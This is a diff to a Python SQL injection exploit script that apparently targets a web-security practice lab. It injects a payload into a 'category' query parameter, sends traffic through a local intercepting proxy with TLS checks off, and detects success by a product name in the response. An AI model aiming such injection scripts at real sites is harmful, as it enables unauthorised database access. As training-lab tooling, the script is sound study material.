@@ -15,25 +15,24 @@ import urllib3
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
 # a python dictionary named proxies that specifies proxy servers to be used for http and https requests.
 # the proxy server acts as a intermediary between your device and the internet.
-#  It can be use to mask your IP address,
-#  control or monitor network traffic
-#  Add an extra layer of anonymity or security
+# It can be use to mask your IP address,
+# control or monitor network traffic
+# Add an extra layer of anonymity or security
 # Web scrapping(avoiding ip basn or rate-limiting), Penetration testing, Bypassing restrictions
 
 # This line sends a GET request to the specified URL and stores the response in the 'response' variable.
 
-# print(sys.argv)
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
  
 def exploit_sqlinjection(url, payload):
-    
     uri = '/filter?category='
-    response = requests.get(url + uri + payload, verify=False, proxies=proxies)
-
-    if "Cheshire Cat Grin"in response.text:
+    full_url = url + uri + payload
+    response = requests.get(full_url, verify=False, proxies=proxies)
+    print(f"[DEBUG] Sending request to: {full_url}")
+    
+    if "Cheshire Cat Grin" in response.text:
        return True
-    else:
-       return False
+    return False
 
 if __name__ == "__main__":
     try:
